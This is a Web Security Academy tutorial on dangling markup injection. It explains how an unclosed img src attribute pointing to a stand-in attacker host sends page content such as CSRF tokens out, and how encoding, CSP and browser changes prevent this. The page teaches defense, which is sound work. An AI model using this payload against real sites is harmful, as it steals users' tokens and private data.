# Dangling markup injection

Source: https://portswigger.net/web-security/cross-site-scripting/dangling-markup
Fetched: 2026-06-28T09:17:45.010114+00:00

Web Security Academy

Cross-site scripting

Dangling markup

Dangling markup injection

In this section, we'll explain dangling markup injection, how a typical exploit works, and how to prevent dangling markup attacks.

What is dangling markup injection?

Dangling markup injection is a technique for capturing data cross-domain in situations where a full cross-site scripting attack isn't possible.

Suppose an application embeds attacker-controllable data into its responses in an unsafe way:

<input type="text" name="input" value="CONTROLLABLE DATA HERE

Suppose also that the application does not filter or escape the > or " characters. An attacker can use the following syntax to break out of the quoted attribute value and the enclosing tag, and return to an HTML context:

">

In this situation, an attacker would naturally attempt to perform XSS. But suppose that a regular XSS attack is not possible, due to input filters, content security policy, or other obstacles. Here, it might still be possible to deliver a dangling markup injection attack using a payload like the following:

"><img src='//attacker-website.com?

This payload creates an img tag and defines the start of a src attribute containing a URL on the attacker's server. Note that the attacker's payload doesn't close the src attribute, which is left "dangling". When a browser parses the response, it will look ahead until it encounters a single quotation mark to terminate the attribute. Everything up until that character will be treated as being part of the URL and will be sent to the attacker's server within the URL query string. Any non-alphanumeric characters, including newlines, will be URL-encoded.

The consequence of the attack is that the attacker can capture part of the application's response following the injection point, which might contain sensitive data. Depending on the application's functionality, this might include CSRF tokens, email messages, or financial data.

Any attribute that makes an external request can be used for dangling markup.

This next lab is difficult to solve because all external requests are blocked. However, there are certain tags that allow you to store data and retrieve it from an external server later. Solving this lab might require user interaction.

How to prevent dangling markup attacks

You can prevent dangling markup attacks using the same general defenses for preventing cross-site scripting, by encoding data on output and validating input on arrival.

You can also mitigate some dangling markup attacks using content security policy (CSP). For example, you can prevent some (but not all) attacks, using a policy that prevent tags like img from loading external resources.

Note

The Chrome browser has decided to tackle dangling markup attacks by preventing tags like img from defining URLs containing raw characters such as angle brackets and newlines. This will prevent attacks since the data that would otherwise be captured will generally contain those raw characters, so the attack is blocked.

Find XSS vulnerabilities using Burp Suite

Try for free
